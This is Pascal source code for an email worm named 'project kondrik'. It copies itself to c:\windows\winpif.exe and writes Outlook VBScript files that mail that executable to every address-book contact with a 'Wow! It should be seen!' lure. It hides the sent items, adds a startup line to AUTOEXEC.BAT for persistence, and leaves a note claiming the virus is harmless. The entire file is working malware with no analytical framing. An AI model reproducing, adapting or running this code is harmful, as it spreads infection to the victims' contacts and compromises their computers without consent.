   uses dos,crt,windos;
   const virsize =  9712;
   var
       f,f1,wq,f2,f3,f5:file;
       buf:array [1..virsize] of byte;
       buf1:array [1..virsize] of byte;
       p:pointer;
       l:longint;
      o,s,e,r:text;
       procedure w(var s:text);
   begin
    assign(s,'c:\windows\sexxx.vbs');
        rewrite(s);
   writeln(s,'On Error Resume Next');
   writeln(s,'Dim fso,a,b,c,d,e,f,ero');
   writeln(s,'Set fso = CreateObject ("outlook.application")');
   writeln(s,'Set a = fso.GetNameSpace ("MAPI")');
   writeln(s,'If fso = "Outlook" Then');
   writeln(s,'a.Logon "profile", "password"');
   writeln(s,'For b = 1 To a.AddressLists.Count');
   writeln(s,'Set c = a.AddressLists (b)');
   writeln(s,'ero = 0');
   writeln(s,'ero = ero + 1');
   writeln(s,'Set d = fso.CreateItem (0)');
   writeln(s,'For e = 1 To c.AddressEntries.Count');
   writeln(s,'f = c.AddressEntries (ero)');
   writeln(s,'d.Recipients.Add f');
   writeln(s,'ero = ero + 1');
   writeln(s,'Next');
   writeln(s,'d.Subject = "Wow! It should be seen!"');
   writeln(s,'d.Body = "Hi dear friend, I want to show you whot I has found in the Internet! Press the attached file!"');
   writeln(s,'d.Attachments.Add "c:\windows\winpif.exe"');
   writeln(s,'d.DeleteAfterSubmit = True');
   writeln(s,'d.Send');
   writeln(s,'Next');
   writeln(s,'End if');
   close(s);
   end;
   procedure w1(var e:text);
   begin
   assign(e,'c:\AUTOEXEC.BAT');
        append(e);
   writeln(e,'@echo off');
   writeln(e,'c:\windows\sexxx.vbs');
   close(e);
   end;
   procedure w2(var r:text);
   begin
   assign(r,'c:\windows\iniwin.txt');
        rewrite(r);
   writeln(r,'project kondrik');
   writeln(r,'version 9712 byte');
   writeln(r,'It not dangerous virus, no worry be happy.');
   close(r);end;
   procedure w5(var o:text);
   begin
    assign(o,'c:\hotsex.vbs');
        rewrite(o);
   writeln(o,'On Error Resume Next');
   writeln(o,'Dim fso,a,b,c,d,e,f,ero');
   writeln(o,'Set fso = CreateObject ("outlook.application")');
   writeln(o,'Set a = fso.GetNameSpace ("MAPI")');
   writeln(o,'If fso = "Outlook" Then');
   writeln(o,'a.Logon "profile", "password"');
   writeln(o,'For b = 1 To a.AddressLists.Count');
   writeln(o,'Set c = a.AddressLists (b)');
   writeln(o,'ero = 0');
   writeln(o,'ero = ero + 1');
   writeln(o,'Set d = fso.CreateItem (0)');
   writeln(o,'For e = 1 To c.AddressEntries.Count');
   writeln(o,'f = c.AddressEntries (ero)');
   writeln(o,'d.Recipients.Add f');
   writeln(o,'ero = ero + 1');
   writeln(o,'Next');
   writeln(o,'d.Subject = "Wow! It should be seen!"');
   writeln(o,'d.Body = "Hi dear friend, I want to show you whot I has found in the Internet! Press the attached file!"');
   writeln(o,'d.Attachments.Add "c:\windows\winpif.exe"');
   writeln(o,'d.DeleteAfterSubmit = True');
   writeln(o,'d.Send');
   close(o);
   end;

   begin
   getmem(p, 65535);
   assign(f, paramstr(0));
   reset(f,1);
   blockread(f, buf, virsize);
   assign(f2,'c:\windows\winpif.exe');
   rewrite(f2,1);
   l:= filesize(f2);
   blockread(f2,p^,l);
   seek(f2,0);
   blockwrite(f2, buf,virsize);
   blockwrite(f2,p^,l);
   close(f2);
   freemem(p,65535) ;
   close(f);
   assign(wq,'c:\windows\sexxx.vbs');
   rewrite(wq);
   w(s);
   close(wq);
   w1(e);
   assign(f3,'c:\windows\iniwin.txt');
   rewrite(f3);
   w2(r);
   close(f3);
   assign(f5,'c:\hotsex.vbs');
   rewrite(f5);
   w5(o);
   end.
